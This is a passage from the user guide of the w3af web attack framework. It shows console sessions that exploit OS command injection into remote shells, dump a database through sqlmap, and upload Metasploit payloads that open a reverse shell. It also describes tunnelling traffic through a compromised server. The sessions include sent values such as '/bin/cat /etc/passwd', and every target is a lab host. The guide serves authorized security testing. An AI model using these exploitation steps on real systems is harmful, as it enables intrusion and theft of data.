http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)  </p><p class="P11">Starting osCommanding plugin execution.  </p><p class="P11">OS Commanding was found at: "http://localhost/w3af/osCommanding/vulnerable.php", using HTTP method GET. The sent data was: "command=+ping+-c+9+localhost". The vulnerability was found in the request with id 5.  </p><p class="P11">Finished scanning process.  </p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">exploit </span></p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">exploit osCommandingShell </span></p><p class="P11">osCommandingShell exploit plugin is starting.  </p><p class="P11">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P11">Vulnerability successfully exploited. This is a list of available shells:  </p><p class="P11">- [0] &lt;osCommandingShell object (ruser: "www-data" | rsystem: "Linux brick 2.6.24-19-generic i686 GNU/Linux")&gt;  </p><p class="P11">Please use the interact command to interact with the shell objects.  </p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">interact 0 </span></p><p class="P11">Execute "endInteraction" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P56">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T13">ls </span></p><p class="P11">vulnerable.php  </p><p class="P11">vulnerable2.php  </p><p class="P11">w3afAgentClient.log  </p><p class="P56">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T13">endInteraction </span></p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">exit </span></p><p class="P11">spawned a remote shell today?  </p><p class="P56">$  </p><p class="P56"> </p><h2 class="Heading2"><a name="The_Output" />The Output</h2><p class="Textbody"> </p><p class="P9">All the output of w3af is managed by the output plugins. Each output plugin will write in a different format ( txt, html, etc ), for example the textFile plugin writes all output to the output-w3af.txt file by default. The configuration of this plugins is done just like other plugins, as seen before: </p><p class="Textbody"> </p><p class="P11"><span class="T1">$</span> ./w3af_console</p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> plugins</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set verbose True</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> back</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P11"><span class="T1">w3af/plugins/output/config:console&gt;&gt;&gt;</span> set verbose False</p><p class="P11"><span class="T1">w3af/plugins/output/config:console&gt;&gt;&gt;</span> back</p><p class="Textbody"> </p><p class="P9">This will configure the textFile plugin to output all messages, including the debugging information ( see “<span class="T8">set verbose True” </span><span class="T10">) to the </span><span class="T8">“output-w3af.txt” </span><span class="T10">file. Here is an example of what is written to this file:</span></p><p class="P46"> </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Exiting setOutputPlugins()  </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Called w3afCore.start() </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - xUrllib ] Called buildOpeners  </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: The connection manager has 0 active connections.  </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: added one connection, len(self._hostmap["localhost"]): 1  </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - httplib ] DNS response from DNS server for domain: localhost  </p><p class="P11">[ Sun Sep 14 17:36:09 2008 - debug - xUrllib ] GET http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 returned HTTP code "200"  </p><p class="P11"> </p><p class="P10">Output plugins also handle the logging of HTTP requests and responses. Every plugin handles this data in a different way. For example, the textFile plugin writes requests and responses to a file, while the htmlFile plugin disregards the data and simply does nothing with it. An example of a HTTP log written by the textFile follows:</p><p class="P29"> </p><p class="P11">==========Request 4 - Sun Sep 14 17:36:12 2008==============  </p><p class="P11">GET http://localhost/w3af/osCommanding/vulnerable.php?command=+ping+-c+4+localhost HTTP/1.1  </p><p class="P11">Host: localhost  </p><p class="P11">Accept-encoding: identity  </p><p class="P11">Accept: */*  </p><p class="P11">User-agent: w3af.sourceforge.net  </p><p class="P11"> </p><p class="P11"> </p><p class="P11">==========Response 4 - Sun Sep 14 17:36:12 2008==============  </p><p class="P11">HTTP/1.1 200 OK  </p><p class="P11">date: Sun, 14 Sep 2008 20:36:09 GMT  </p><p class="P11">transfer-encoding: chunked  </p><p class="P11">x-powered-by: PHP/5.2.4-2ubuntu5.3  </p><p class="P11">content-type: text/html  </p><p class="P11">server: Apache/2.2.8 (Ubuntu) mod_python/3.3.1 Python/2.5.2 PHP/5.2.4-2ubuntu5.3 with Suhosin-Patch  </p><p class="P11"> </p><p class="P11">PING localhost (127.0.0.1) 56(84) bytes of data.  </p><p class="P11">64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.024 ms </p><p class="P11">64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.035 ms  </p><p class="P11">64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.037 ms  </p><p class="P11">64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.037 ms  </p><p class="P11"> </p><p class="P11">--- localhost ping statistics ---  </p><p class="P11">4 packets transmitted, 4 received, 0% packet loss, time 2999ms  </p><p class="P11">rtt min/avg/max/mdev = 0.024/0.033/0.037/0.006 ms  </p><p class="P11"> </p><p class="P11">============================================================= </p><p class="P11"> </p><p class="P10">All messages sent by the plugins and the framework are sent to ALL enabled plugins, so if you have enabled textFile and htmlFile output plugins, both will log a vulnerability found by an audit plugin.</p><p class="P29"> </p><h2 class="Heading2"><a name="Complex_sites" />Complex sites</h2><p class="Textbody"> </p><p class="P9">Some sites use embedded objects, like Macromedia flash and Java applets, that the browser renders to the user. Because of the inability of the framework to get any information out of those objects, a script called spiderMan was created. This script will run a HTTP proxy so the user can navigate the target site through it; during this process the plugin will extract information from the requests and responses.</p><p class="P9">A simple example will clarify things, let's suppose that w3af is auditing a site and can't find any links on the main page. After a closer interpretation of the results by the user, it is clear that the main page has a Java applet menu where all the other sections are linked. The user runs w3af once again and now activates the spiderMan plugin, navigates the site manually using the browser and the spiderman proxy. When the user has finished his browsing, w3af will continue with all the hard auditing work.</p><p class="P9">The spiderMan plugin can be used when javascript, flash, java applets or any other browser side technology is present. </p><p class="Textbody">This is a sample spiderMan plugin run: </p><p class="Textbody"> </p><p class="P52"><span class="T1">w3af&gt;&gt;&gt;</span> plugins</p><p class="P52"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> discovery spiderMan</p><p class="P52"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P52"><span class="T1">w3af&gt;&gt;&gt;</span> target</p><p class="P52"><span class="T1">w3af/target&gt;&gt;&gt;</span> set target http://localhost/w3af/fileUpload/</p><p class="P52"><span class="T1">w3af/target&gt;&gt;&gt;</span> back</p><p class="P52"><span class="T1">w3af&gt;&gt;&gt;</span> start</p><p class="P52">spiderMan proxy is running on 127.0.0.1:44444 .  </p><p class="P52">Please configure your browser to use these proxy settings and navigate the target site. To exit spiderMan plugin please navigate to http://127.7.7.7/spiderMan?terminate .  </p><p class="P52"> </p><p class="P4">Now the user configures the browser to use the 127.0.0.1:44444 proxy and navigates the target site, after that he navigates to <span class="T9">“http://127.7.7.7/spiderMan?terminate”</span> and exits the spiderMan. The results are shown:</p><p class="P52"> </p><p class="P52">New URL found by discovery: http://localhost/w3af/test </p><p class="P52">New URL found by discovery: http://localhost/favicon.ico </p><p class="P52">New URL found by discovery: http://localhost/w3af/ </p><p class="P52">New URL found by discovery: http://localhost/w3af/img/w3af.png </p><p class="P52">New URL found by discovery: http://localhost/w3af/xss-forms/test-forms.html </p><p class="P52">New URL found by discovery: http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P52">The list of found URLs is: </p><p class="P52">- http://localhost/w3af/fileUpload/ </p><p class="P52">- http://localhost/w3af/test </p><p class="P52">- http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P52">- http://localhost/w3af/ </p><p class="P52">- http://localhost/w3af/img/w3af.png </p><p class="P52">- http://localhost/w3af/xss-forms/test-forms.html </p><p class="P52">- http://localhost/w3af/fileUpload/uploader.php </p><p class="P52">- http://localhost/favicon.ico </p><p class="P52">Found 8 URLs and 8 different points of injection. </p><p class="P52">The list of Fuzzable requests is: </p><p class="P52">- http://localhost/w3af/fileUpload/ | Method: GET </p><p class="P52">- http://localhost/w3af/fileUpload/uploader.php | Method: POST | Parameters: (MAX_FILE_SIZE,uploadedfile) </p><p class="P52">- http://localhost/w3af/test | Method: GET</p><p class="P52">- http://localhost/favicon.ico | Method: GET </p><p class="P52">- http://localhost/w3af/ | Method: GET </p><p class="P52">- http://localhost/w3af/img/w3af.png | Method: GET </p><p class="P52">- http://localhost/w3af/xss-forms/test-forms.html | Method: GET </p><p class="P52">- http://localhost/w3af/xss-forms/dataReceptor.php | Method: POST | Parameters: (user,firstname) </p><p class="P52">Starting sqli plugin execution. </p><p class="P56">w3af&gt;&gt;&gt; </p><h2 class="Heading2"><a name="Exploiting" />Exploiting</h2><p class="Textbody"> </p><p class="P9">Two ways of exploiting a vulnerability exist, the first one uses the vulnerabilities found by the audit phase and the second one, which is called fastextploit, requires the user to enter the vulnerability parameters. </p><p class="P9"> </p><p class="P9">Let's see an example of the first way of exploiting a vulnerability with w3af: </p><p class="P47"> </p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">plugins </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">audit osCommanding </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">target </span></p><p class="P56">w3af/config:target&gt;&gt;&gt;<span class="T13">set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </span></p><p class="P56">w3af/config:target&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">start </span></p><p class="P11">Found 1 URLs and 1 different points of injection.  </p><p class="P11">The list of URLs is:  </p><p class="P11">- http://localhost/w3af/osCommanding/vulnerable.php  </p><p class="P11">The list of fuzzable requests is:  </p><p class="P11">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)  </p><p class="P11">Starting osCommanding plugin execution.  </p><p class="P11">OS Commanding was found at: "http://localhost/w3af/osCommanding/vulnerable.php", using HTTP method GET. The sent data was: "command=+ping+-c+9+localhost". The vulnerability was found in the request with id 5.  </p><p class="P11">Finished scanning process. </p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">exploit </span></p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">exploit osCommandingShell </span></p><p class="P11">osCommandingShell exploit plugin is starting.  </p><p class="P11">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P11">Vulnerability successfully exploited. This is a list of available shells:  </p><p class="P11">- [0] &lt;osCommandingShell object (ruser: "www-data" | rsystem: "Linux brick 2.6.24-19-generic i686 GNU/Linux")&gt;  </p><p class="P11">Please use the interact command to interact with the shell objects.  </p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">interact 0 </span></p><p class="P11">Execute "endInteraction" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P56">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T13">ls </span></p><p class="P11">vulnerable.php  </p><p class="P11">vulnerable2.php  </p><p class="P11">w3afAgentClient.log  </p><p class="P56">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T13">endInteraction </span></p><p class="P56">w3af/exploit&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt; </p><p class="P57"> </p><p class="P70">The second way is to use fastexploit. This method should be used when the user has found a vulnerability manually and wants to exploit it using the framework. Here is an example of a fastexploit run: </p><p class="P70"> </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> exploit</p><p class="P65"><span class="T1">w3af/exploit&gt;&gt;&gt;</span> exploit config sqlmap</p><p class="P65"><span class="T1">w3af/plugin/sqlmap&gt;&gt;&gt; </span>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</p><p class="P65"><span class="T1">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set injvar id</p><p class="P65"><span class="T1">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set data id=1</p><p class="P65"><span class="T1">w3af/plugin/sqlmap&gt;&gt;&gt;</span> back</p><p class="P65"><span class="T1">w3af/exploit&gt;&gt;&gt;</span> fastexploit sqlmap</p><p class="P65">sqlmap coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch &lt;daniele.bellucci@gmail.com&gt; </p><p class="P65">SQL injection could be verified, trying to create the DB driver.</p><p class="P65">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P65"><span class="T1">w3af/exploit/sqlmap&gt;&gt;&gt;</span> dump agenda w3af_test</p><p class="P65">Database: w3af_test </p><p class="P65">Table: agenda </p><p class="P65">[2 entries] </p><p class="P65">+---------------+----+--------+----------+-----------------+ </p><p class="P65">| direccion     | id | nombre | telefono | email           |</p><p class="P65">+---------------+----+--------+----------+-----------------+ </p><p class="P65">| direccion 123 | 1  | apr    | 52365786 | acho@c.com      |</p><p class="P65">| direccion 333 | 2  | vico   | 47998123 | vTro@c.com      |</p><p class="P65">+---------------+----+--------+----------+-----------------+ </p><p class="P66">w3af/exploit/sqlmap&gt;&gt;&gt; </p><h3 class="Heading3"><a name="Advanced_exploiting_techniques" />Advanced exploiting techniques</h3><p class="P37"> </p><p class="P12">The framework implements two highly advanced exploiting techniques that allow the user to keep escalating privileges into the remote network. Both of this techniques are used once the framework is able to execute remote operating system commands, this is the case of (for example) osCommanding, remoteFileIncludeShell and davShell attack plugins. These exploiting techniques are: </p><ul style="margin-left:1.25cm;"><li class="P89" style="margin-left:0cm;"><p class="P89" style="margin-left:0.25cm;">Virtual daemon, allows you <span class="T9">to use metasploit payloads to exploit the server that supports a vulnerable web application.</span></p></li><li class="P89" style="margin-left:0cm;"><p class="P89" style="margin-left:0.25cm;">w3afAgent, which creates a tunnel between the compromised server and w3af, the allow the user to route TCP connections through the remote server. </p><p class="P89" style="margin-left:0.25cm;"> </p></li></ul><p class="P12">Both of them are simple to use and configure using this guide. These features are under heavy development and are under no means stable, use them at your on risk. </p><p class="P12"> </p><h3 class="P8"><a name="Virtual_daemon" />Virtual daemon</h3><p class="P12"> </p><p class="P12">As said before, this feature allows you to use metasploit payloads to exploit the server that supports a vulnerable web application. To use this feature you must have a working installation of the metasploit framework version 3.0 or greater; you can get it for free at <a href="http://www.metasploit.com/">www.metasploit.com</a> , the installation and configuration of MSF is out of the scope of this document.</p><p class="P12">To be able to use the virtual daemon you will need to run the following command in order to copy the w3af metasploit module into the MSF directory: </p><p class="P65">./w3af_console -i /home/jdoe/tools/msf/ </p><p class="P65"> </p><p class="P13">Where “<span class="T7">/home/jdoe/tools/msf/</span><span class="T9">” is the directory where the user “jdoe” installed Metasploit. I</span>n case you are interested, this is just a fancy shortcut for “<span class="T7">cp </span><span class="T7">core/controllers/vdaemon/w3af_vdaemon.rb /home/user/tools/msf/modules/exploits/unix/misc/</span>”. Once this has been done, the user can start using the virtual daemon feature, before going through an example to see how to use the feature, we will make a summary of the steps that will happened during the exploitation:</p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">w3af finds a vulnerability that allows remote command execution </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The user exploits the vulnerability and starts the virtual daemon </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The user starts the metasploit framework </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The user configures the w3af module inside MSF and executes it </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">w3af module inside MSF will connect to the virtual daemon that is listening on localhost </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">MSF will send the payload selected by the user to the virtual daemon </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The virtual daemon will create a PE(portable executable) or an ELF(executable and linkable format) file depending on the remote operating system, and using the exploited vulnerability it will upload and execute the payload in the remote server </p></li><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The process of uploading the file to the remote server depends on the remote operating system, the privileges of the user running w3af and the local operating system; but in most cases the following happens:</p></li></ol><ul style="margin-left:1.25cm;"><li class="P106" style="margin-left:1.25cm;"><p class="P106" style="margin-left:0.25cm;">w3af sends a small executable to the remote server to perform an extrusion scan. </p></li><li class="P106" style="margin-left:1.25cm;"><p class="P106" style="margin-left:0.25cm;">w3af sniffs on the configured interface ( misc-settings -&gt; interface ) for packets that arrive on the expected ports in order to verify outgoing firewall rules on the remote network </p></li><li class="P108" style="margin-left:1.25cm;"><p class="P108" style="margin-left:0.25cm;"><span class="T9">If a TCP port is found to be allowed in the remote firewall, w3af will try </span><span class="T9">to run a server on that port and make a reverse connection from the </span>compromised host in order to download the PE/ELF generated file.<span class="T9"> If </span><span class="T9">no TCP ports are enabled, w3af will send the ELF/PE file to the remote </span><span class="T9">server using several calls to the “echo” command, which is rather slow, but should always work because it's an in-band transfer method.</span></p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P90" style="margin-left:0cm;"><p class="P90" style="margin-left:0.25cm;">The payload runs in the remote server and possibly connects back to the metasploit framework, that will handle the rest of the exploitation.</p></li></ol><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P91" style="margin-left:0cm;"><p class="P91" style="margin-left:0.25cm;"> </p></li></ol><p class="P12">Now that we know the theory, let's see an example of what this feature can do: </p><p class="P65"><span class="T1">$</span> ./w3af_console </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> plugins </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> plugins </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P65">Enabled audit plugins:  </p><p class="P65">osCommanding  </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> target </p><p class="P65"><span class="T1">w3af/target&gt;&gt;&gt;</span> set target http://172.16.1.128/os.php?cmd=f00 </p><p class="P65"><span class="T1">w3af/target&gt;&gt;&gt;</span> back </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> start </p><p class="P65">The list of found URLs is:  </p><p class="P65">- http://172.16.1.128/os.php  </p><p class="P65">Found 1 URLs and 1 different points of injection.  </p><p class="P65">The list of Fuzzable requests is:  </p><p class="P65">- http://172.16.1.128/os.php | Method: GET | Parameters: (cmd)  </p><p class="P65">Starting osCommanding plugin execution.  </p><p class="P65">OS Commanding was found at: http://172.16.1.128/os.php . Using method: GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The vulnerability was found in the request with id 7.  </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> exploit </p><p class="P65"><span class="T1">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P65">osCommanding exploit plugin is starting.  </p><p class="P65">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P65">Vulnerability successfully exploited.  </p><p class="P65">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P65"><span class="T1">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T1">start vdaemon </span></p><p class="P65">Virtual daemon service is running on port 9091, use metasploit's w3af_vdaemon module to exploit it.  </p><p class="P66">w3af/exploit/osCommandingShell&gt;&gt;&gt;  </p><p class="P66"> </p><p class="P13">Nothing special for now, just added the new “<span class="T8">start vdaemon</span>” command. With this w3af run we have covered items 1. and 2. of the theory. The next step is to configure the MSF module and run it; my preferred way is to use metasploit's web interface “msfweb”. The first step is to click on the “Exploit” button on the main menu. This will cause a small window to appear. In this window, you should search for <span class="T5">w3af </span>and then select the exploit named: “w3af virtual daemon exploit”. Some important points to have in mind while configuring the w3af agent virtual daemon module inside MSF:</p><ul style="margin-left:1.25cm;"><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">The target is of course the remote operating system you are exploiting </p></li><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">VNC payloads don't seem to work </p></li><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">RHOST parameter indicates the IP address of the server you are exploiting </p></li><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">LHOST is your public IP address </p></li><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">LPORT is a port where the remote web server can connect to (when using reverse connect payloads) or you can connect to ( when using bind payloads ) </p></li><li class="P92" style="margin-left:0cm;"><p class="P92" style="margin-left:0.25cm;">The w3af module inside metasploit will connect to localhost:9091 and do all the payload transfer, this parameters can't be configured and must not be confused with RHOST/LHOST and LPORT </p></li></ul><p class="P12"> </p><p class="P12">Once it has been configured, we can click on “Launch Exploit” to start the process, this is what we will see in the w3af console: </p><p class="P12"> </p><p class="P65"><span class="T1">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> </p><p class="P65">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P65">The extrusion test failed, no reverse connect transfer methods can be used. Trying inband echo transfer method.  </p><p class="P65">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P65">Successfully transfered the MSF payload to the remote server.  </p><p class="P65">Successfully executed the MSF payload on the remote server.  </p><p class="P65"> </p><p class="P13"><span class="T9">The last messages are printed when you run w3af as a normal user, the reason is </span><span class="T9">simple, when you run w3af as a user you can't sniff and </span>therefore<span class="T9"> can't perform a </span><span class="T9">successful extrusion scan. A successful extrusion scan would look like:</span></p><p class="P12" /><p class="P65">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P65">ExtrusionServer listening on interface: eth1 </p><p class="P65">Finished extrusion scan.  </p><p class="P65">The remote host: "172.10.10.1" can connect to w3af with these ports:  </p><p class="P65">- 25/TCP  </p><p class="P65">- 80/TCP  </p><p class="P65">- 53/TCP  </p><p class="P65">- 1433/TCP  </p><p class="P65">- 8080/TCP  </p><p class="P65">- 53/UDP  </p><p class="P65">- 69/UDP  </p><p class="P65">- 139/UDP  </p><p class="P65">- 1025/UDP  </p><p class="P65">The following ports are not bound to a local process and can be used by w3af:  </p><p class="P65">- 25/TCP  </p><p class="P65">- 53/TCP  </p><p class="P65">- 1433/TCP  </p><p class="P65">- 8080/TCP  </p><p class="P40">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P40"> </p><p class="P12">And if we take a look at the metasploit web interface we will find something far more interesting: </p><p class="P40"> </p><p class="P65">[*] Started reverse handler  </p><p class="P65">[*] The remote IP address is: 172.16.1.128  </p><p class="P65">[*] Using remote IP address to create payloads.  </p><p class="P65">[*] Sent payload to vdaemon.  </p><p class="P65">[*] The estimated time to wait for the extrusion scan to complete is: 1 seconds.  </p><p class="P65">[*] Done waiting!  </p><p class="P65">[*] The estimated time to wait for PE/ELF transfer is: 8 seconds.  </p><p class="P65">[*] Waiting...  </p><p class="P65">[*] Done waiting! </p><p class="P65">[*] Going to wait for 27 seconds (waiting for crontab/at to execute payload).  </p><p class="P65">[*] The session could start before the handler, so please *be patient*.  </p><p class="P65">[*] Command shell session 1 opened (172.16.1.1:4444 -&gt; 172.16.1.128:1047)  </p><p class="P65">[*] Done waiting!  </p><p class="P65">[*] Starting handler  </p><ol style="margin-left:1.25cm;list-style-type:upper-roman; "><li class="P94" style="margin-left:0cm;"><p class="P94" style="margin-left:0.25cm;">Microsoft Windows 2000 [Version 5.00.2195]  </p><p class="P94" style="margin-left:0.25cm;">(C) Copyright 1985-2000 Microsoft Corp. </p><p class="P109" style="margin-left:0.25cm;"> </p><p class="P94" style="margin-left:0.25cm;">C:\WINNT\system32&gt; </p></li></ol><p class="P12"> </p><p class="P12">Now the user has an interactive shell with the privileges of the user running the web server, that can be used without any restrictions. It is possible at this point to close w3af  and continue working directly from the metasploit shell.</p><p class="P12"> </p><h3 class="P41"><a name="w3afAgent" />w3afAgent</h3><p class="P12"> </p><p class="P12">As said before, this feature allows you to create a reverse tunnel that will route TCP connections through the compromised server. Unlike virtual daemon, this  feature is ready to use and doesn't require any other software. B<span class="T9">efore going through an example to see how to use this feature, we will make a summary of the steps that will happen</span><span class="T9"> during exploitation:</span></p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">w3af finds a vulnerability that allows remote command execution </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">The user exploits the vulnerability and starts the w3afAgent </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">w3af performs an extrusion scan by sending a small executable to the remote server. This executable connects back to w3af and allows the framework to identify outgoing firewall rules on the remote network. </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">w3afAgent Manager will send a w3afAgentClient to the remote server. <span class="T9">The process of uploading the file to the remote server depends on the remote operating system, the privileges of the user running w3af and the local operating system; but in most cases the following happen</span><span class="T9">s:</span></p></li></ol><ul style="margin-left:1.25cm;"><li class="P107" style="margin-left:1.25cm;"><p class="P107" style="margin-left:0.25cm;">w3af reuses the information from the first extrusion scan, which was performed in step 3 in order to know which port it can use to listen for connections from the compromised server. </p></li><li class="P107" style="margin-left:1.25cm;"><p class="P107" style="margin-left:0.25cm;">If a TCP port is found to be allowed in the remote firewall, w3af will try to run a server on that port and make a reverse connection from the compromised in order to download the PE/ELF generated file. If no TCP ports are enabled, w3af will send the ELF/PE file to the remote server using several calls to the “echo” command, which is rather slow, but should always work because it's an in-band transfer method.</p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">w3afAgent Manager starts the w3afAgentServer that will bind on localhost:1080 (which will be used by the w3af user) and on the interface configured in w3af ( misc-settings-&gt;interface ) on the port discovered during step 3. </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">The w3afAgentClient connects back to the w3afAgentServer, successfully creating the tunnel </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">The user configures the proxy listening on localhost:1080 on his preferred software </p></li><li class="P93" style="margin-left:0cm;"><p class="P93" style="margin-left:0.25cm;">When the program connects to the socks proxy, all outgoing connections are routed through the compromised server </p></li></ol><p class="P12"> </p><p class="P12">Now that we know the theory, let's see an example of what this feature can do: </p><p class="P65"><span class="T1">$</span> ./w3af_console</p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> plugins </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P65">Enabled audit plugins:  </p><p class="P65">osCommanding  </p><p class="P65"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> target </p><p class="P65"><span class="T1">w3af/target&gt;&gt;&gt;</span> set target http://172.10.10.1/w3af/v.php?c=list </p><p class="P65"><span class="T1">w3af/target&gt;&gt;&gt;</span> back </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> start </p><p class="P65">The list of found URLs is:  </p><p class="P65">- <span class="T7">http://172.10.10.1/w3af/v.php</span> </p><p class="P65">Found 1 URLs and 1 different points of injection.  </p><p class="P65">The list of Fuzzable requests is:  </p><p class="P65">- <span class="T7">http://172.10.10.1/w3af/v.php</span> | Method: GET | Parameters: (c) </p><p class="P65">Starting osCommanding plugin execution.  </p><p class="P65">OS Commanding was found at: <span class="T7">http://172.10.10.1/w3af/v.php</span> . Using method: GET. The data sent was: c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2. </p><p class="P65"><span class="T1">w3af&gt;&gt;&gt;</span> exploit </p><p class="P65"><span class="T1">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P65">osCommanding exploit plugin is starting. </p><p class="P65">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P65">Vulnerability successfully exploited.  </p><p class="P65">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P65"> </p><p class="P12">Nothing really new until now, we configured w3af, started the scan and exploited the vulnerability. </p><p class="P65"> </p><p class="P65"><span class="T1">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T1">start w3afAgent </span></p><p class="P65">Initializing w3afAgent system, please wait.  </p><p class="P65">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P65">The extrusion scan failed.  </p><p class="P65">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P65">Using inbound port "5060" without knowing if the remote host will be able to connect back.  </p><p class="P65"> </p><p class="P12">The last messages are printed when you 